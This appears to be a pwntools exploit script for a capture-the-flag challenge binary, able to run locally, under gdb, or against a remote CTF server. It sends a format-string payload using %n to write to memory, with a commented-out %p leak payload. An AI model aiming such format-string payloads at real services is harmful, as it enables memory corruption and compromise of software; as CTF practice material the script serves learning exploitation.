from pwn import *
BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10009
LOCAL = True
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *main+110
        b *main+132
        b *main+148
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
if not LOCAL:
    print(p.recv())  # Weird behaviour from the server
target = "we dont know dumbass"
payload = b'%1337x%9$n'
# payload = b'A'*11 + b'%6$p'
print(f"Payload length is: {len(payload)}")
print(p.recv())
p.sendline(payload)
print(p.recvline().decode())
print(p.recvline())
p.close()
